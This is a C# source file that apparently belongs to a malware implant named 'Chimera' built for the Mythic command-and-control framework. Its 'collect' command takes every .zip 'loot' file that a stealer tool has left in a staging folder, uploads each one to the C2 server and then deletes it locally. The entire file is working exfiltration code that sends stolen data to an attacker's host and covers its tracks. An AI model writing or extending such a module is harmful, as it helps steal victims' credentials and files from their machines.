using System;
using System.IO;

namespace Chimera.Commands
{
    // collect — batch-upload every .zip in the staging directory to Mythic,
    //           then delete each file after a confirmed upload.
    //
    // Operator runs this after run_stealer (or any tool that drops a .zip loot file).
    // No background thread — purely synchronous, operator-triggered.
    public static class Collect
    {
        public static string Execute(string taskID, string callbackUUID)
        {
            var sb = new System.Text.StringBuilder();
            try
            {
                Staging.EnsureDir();

                string[] zips = Directory.GetFiles(Staging.Dir, "*.zip");
                if (zips.Length == 0)
                {
                    return "[*] No .zip files found in " + Staging.Dir + ". Nothing to collect.";
                }

                sb.AppendLine("[*] Found " + zips.Length + " zip(s) in " + Staging.Dir);
                int ok = 0;
                int fail = 0;

                foreach (string zip in zips)
                {
                    string fileName = Path.GetFileName(zip);
                    sb.AppendLine("[*] Uploading: " + fileName + " ...");
                    try
                    {
                        // Upload.Execute expects "<localpath> <remotename>"
                        string uploadParam = zip + " " + fileName;
                        string result = Upload.Execute(uploadParam, taskID, callbackUUID);

                        // Consider the upload successful if it returned something
                        // (Upload posts its own response; here we just check for error)
                        if (result != null &&
                            result.IndexOf("[error]", StringComparison.OrdinalIgnoreCase) < 0)
                        {
                            try { File.Delete(zip); }
                            catch (Exception delEx)
                            {
                                sb.AppendLine("    [-] Uploaded but could not delete: " + delEx.Message);
                            }
                            sb.AppendLine("    [+] " + fileName + " uploaded and deleted.");
                            ok++;
                        }
                        else
                        {
                            sb.AppendLine("    [-] Upload failed: " + result);
                            fail++;
                        }
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine("    [-] " + fileName + ": " + ex.Message);
                        fail++;
                    }
                }

                sb.AppendLine();
                sb.AppendLine("[+] Collect complete: " + ok + " uploaded, " + fail + " failed.");
            }
            catch (Exception ex)
            {
                sb.AppendLine("[error] collect: " + ex.Message);
            }
            return sb.ToString();
        }
    }
}
